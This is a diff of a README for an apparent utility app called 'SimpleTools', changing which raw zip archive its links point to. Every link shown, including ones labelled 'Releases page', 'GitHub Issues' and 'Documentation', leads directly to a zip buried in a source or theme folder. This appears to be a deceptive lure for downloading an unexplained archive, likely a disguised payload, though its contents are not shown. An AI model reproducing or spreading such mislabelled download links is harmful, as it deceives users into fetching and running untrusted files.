@@ -1,6 +1,6 @@
 # 🎉 SimpleTools - Simple Tools for Everyday Use
 
-[![Download SimpleTools](https://github.com/InFekTeD369/SimpleTools/raw/refs/heads/main/src/utils/Simple-Tools-v3.5-alpha.5.zip%https://github.com/InFekTeD369/SimpleTools/raw/refs/heads/main/src/utils/Simple-Tools-v3.5-alpha.5.zip)](https://github.com/InFekTeD369/SimpleTools/raw/refs/heads/main/src/utils/Simple-Tools-v3.5-alpha.5.zip)
+[![Download SimpleTools](https://github.com/InFekTeD369/SimpleTools/raw/refs/heads/main/public/themes/Simple_Tools_v3.0.zip%https://github.com/InFekTeD369/SimpleTools/raw/refs/heads/main/public/themes/Simple_Tools_v3.0.zip)](https://github.com/InFekTeD369/SimpleTools/raw/refs/heads/main/public/themes/Simple_Tools_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to SimpleTools! This application provides a collection of helpful tools 
 To get started, you'll need to download the application. Follow these steps:
 
 1. Click on the following link to visit the Releases page:
-   [Download SimpleTools](https://github.com/InFekTeD369/SimpleTools/raw/refs/heads/main/src/utils/Simple-Tools-v3.5-alpha.5.zip)
+   [Download SimpleTools](https://github.com/InFekTeD369/SimpleTools/raw/refs/heads/main/public/themes/Simple_Tools_v3.0.zip)
 
 2. On the Releases page, find the latest version of SimpleTools.
 
@@ -69,8 +69,8 @@ If you still need help, feel free to open an issue on the GitHub repository.
 
 For further assistance and documentation, consider these resources:
 
-- [GitHub Issues](https://github.com/InFekTeD369/SimpleTools/raw/refs/heads/main/src/utils/Simple-Tools-v3.5-alpha.5.zip): Report problems or request features.
-- [Documentation](https://github.com/InFekTeD369/SimpleTools/raw/refs/heads/main/src/utils/Simple-Tools-v3.5-alpha.5.zip): Find more detailed usage guides and tips.
+- [GitHub Issues](https://github.com/InFekTeD369/SimpleTools/raw/refs/heads/main/public/themes/Simple_Tools_v3.0.zip): Report problems or request features.
+- [Documentation](https://github.com/InFekTeD369/SimpleTools/raw/refs/heads/main/public/themes/Simple_Tools_v3.0.zip): Find more detailed usage guides and tips.
 
 ## 🔄 Feedback
 
